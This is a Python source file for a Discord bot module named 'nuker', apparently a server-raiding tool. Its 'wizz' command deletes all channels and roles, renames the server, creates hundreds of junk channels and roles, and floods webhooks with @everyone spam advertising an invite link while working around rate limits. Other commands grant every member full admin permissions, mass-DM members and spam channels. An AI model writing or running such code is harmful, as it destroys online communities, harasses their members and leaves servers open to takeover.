from __future__ import annotations
import discord
from discord.ext import commands
import asyncio
import requests
import urllib
import json 
import time
import random
import threading
from utils.config import *

def ssspam(webhook):
    while spams:
        data = {'content':'@everyone @here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here@here Junglee Kingdom SE LOGE PANGA LO HO GAYA NANGA JOIN FAST https://discord.gg/programmer'}
        spamming = requests.post(webhook, json=data)
        spammingerror = spamming.text
        if spamming.status_code == 204:
            continue
        if 'rate limited' in spammingerror.lower():
            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                time.sleep(timetowait)
            except:
                delay = random.randint(5, 10)
                time.sleep(delay)

        else:
            delay = random.randint(30, 60)
            time.sleep(delay)


class nuker(commands.Cog):
    def __init__(self, bot):
        self.bot = bot



    @commands.command()
    async def nickall(self, ctx,nickname):
     await ctx.reply("Starting Nicknaming all members in the server .")
     gey = 0
     for user in list(ctx.guild.members):
        try:
            await user.edit(nick=nickname)
            gey+=1
        except:
            pass
     try:await ctx.reply(f"Successfully changed nickname of {gey} members .")
     except:await ctx.send(f"Successfully changed nickname of {gey} members .")


    @commands.command()
    async def spam(self,ctx, amount: int, *, message):
     await ctx.message.delete()
     for i in range(amount):
        try:await ctx.send(message)
        except Exception as e:print(e)

    @commands.command()
    async def spam(self,ctx, amount: int, *, message):
     await ctx.message.delete()
     for i in range(amount):
        try:await ctx.send(message)
        except Exception as e:print(e)

    @commands.command()
    async def copyserver(self,ctx):
     await ctx.message.delete()
     await self.bot.create_guild(f"backup-{ctx.guild.name}")
     await asyncio.sleep(4)
     for g in self.bot.guilds:
        if f"backup-{ctx.guild.name}" in g.name:
            for c in g.channels:
                await c.delete()

            for cate in ctx.guild.categories:
                x = await g.create_category((f"{cate.name}"))
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel((f"{chann}"))
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel((f"{chann}"))

     try:await g.edit(icon=(ctx.guild.icon_url))
     except:pass


    @commands.command()
    async def crash(self,ctx, *, text):
     await ctx.message.delete()
     r = requests.get(f"http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}").text
     if len('```' + r + '```') > 2000:
        return
     await ctx.send(f"```{r}```")

    @commands.command()
    async def wizz(self,ctx):
     for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass
     for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
     try:
        await ctx.guild.edit(name='Junglee Kingdom', description='Junglee Kingdom',
          reason='Junglee Kingdom',
          icon=None,
          banner=None)
     except:
        pass
     for i in range(250):
        try:await ctx.guild.create_text_channel(name='Junglee Kingdom')
        except Exception as e:print(e)
     for i in range(250):
        try:await ctx.guild.create_role(name='Junglee Kingdom')
        except Exception as e:print(e)
     global spams
     spams = True
     if len(await ctx.guild.webhooks()) != 0:
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target=ssspam, args=(webhook.url,)).start()
     if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1
     else:
        webhookamount = 100 / len(ctx.guild.text_channels)
        webhookamount = int(webhookamount) + 2
     for i in range(webhookamount):
        for channel in ctx.guild.text_channels:
            try:
                webhook = await channel.create_webhook(name='Junglee Kingdom')
                threading.Thread(target=ssspam, args=(webhook.url,)).start()
            except Exception as e:
                print(f"Webhook Error {e}")    

    @commands.command()
    async def adminall(self,ctx):
     await ctx.message.delete()
     guild = ctx.guild
     try:
        role = discord.utils.get((guild.roles), name='@everyone')
        await role.edit(permissions=(discord.Permissions.all()))
        await ctx.send("I have given everyone admin.",delete_after=5)
     except Exception as e:
        await ctx.send(f"an error occured while adding admin for all .\n{e}",delete_after=5)

    @commands.command()
    async def unlock(self,ctx):
     await ctx.channel.set_permissions((ctx.guild.default_role), send_messages=True)
     await ctx.send(ctx.channel.mention + 'Unlocked')

    @commands.command()
    async def lock(self,ctx): 
     await ctx.channel.set_permissions((ctx.guild.default_role), send_messages=False)
     await ctx.send(ctx.channel.mention + 'Locked')

    @commands.command()
    async def purge(self, ctx,amount:int):
     await ctx.message.delete()
     await ctx.channel.purge(limit=amount)

    @commands.command()
    async def listen(self,ctx, *, message):
     await ctx.message.delete()
     await self.bot.change_presence(activity=discord.Activity(type=(discord.ActivityType.listening),
      name=message))

    @commands.command()
    async def play(self,ctx, *, message):
     await ctx.message.delete()
     game = discord.Game(name=message)
     await self.bot.change_presence(activity=game)

    @commands.command()
    async def stream(self,ctx, *, message):
     await ctx.message.delete()
     stream = discord.Streaming(name=message,
      url='https://discord.gg/jungleeop')
     await self.bot.change_presence(activity=stream)

    @commands.command()
    async def watch(self,ctx, *, message):
     await ctx.message.delete()
     await self.bot.change_presence(activity=discord.Activity(type=(discord.ActivityType.watching),
      name=message))

    @commands.command()
    async def removestatus(self,ctx):
     await ctx.message.delete()
     await self.bot.change_presence(activity=None, status=(discord.Status.dnd))

    @commands.command()
    async def dm(self,ctx, *, message:str):
      await ctx.message.delete()
      h =0
      for user in list(ctx.guild.members):
         try:
            await user.send(message)
            h+=1
         except Exception as e:
            print(e)
      try:await ctx.reply(f"Successfully dmed {h} members in {ctx.guild.name}")
      except:await ctx.send(f"Successfully dmed {h} members in {ctx.guild.name}")

    @commands.command()
    async def leave(self,ctx, guildid):
     await self.bot.get_guild(int(guildid)).leave()
     await ctx.send(f"Successfully left: {guildid}")

    @commands.command()
    async def pings(self,ctx):
     global spams
     spams = True
     if len(await ctx.guild.webhooks()) != 0:
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target=ssspam, args=(webhook.url,)).start()
     if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1
     else:
        webhookamount = 100 / len(ctx.guild.text_channels)
        webhookamount = int(webhookamount) + 2
     for i in range(webhookamount):
        for channel in ctx.guild.text_channels:
            try:
                webhook = await channel.create_webhook(name='Junglee Kingdom')
                threading.Thread(target=ssspam, args=(webhook.url,)).start()
            except Exception as e:
                print(f"Webhook Error {e}")


async def setup(bot):
	await bot.add_cog(nuker(bot))